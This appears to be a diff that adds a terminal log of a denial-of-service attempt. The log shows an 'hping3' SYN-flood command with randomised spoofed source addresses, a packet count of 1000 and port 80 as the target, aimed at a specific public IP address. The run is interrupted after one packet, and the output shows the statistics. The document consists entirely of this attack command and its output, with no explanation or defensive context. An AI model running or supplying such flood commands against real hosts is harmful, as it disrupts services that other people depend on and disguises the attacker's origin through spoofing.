@@ -1,0 +1,6 @@
+ sudo hping3 -i ul -S -s ++3000 -p 80 -c 1000 --rand-source 178.128.237.247
+HPING 178.128.237.247 (eth0 178.128.237.247): S set, 40 headers + 0 data bytes
+^C
+--- 178.128.237.247 hping statistic ---
+1 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
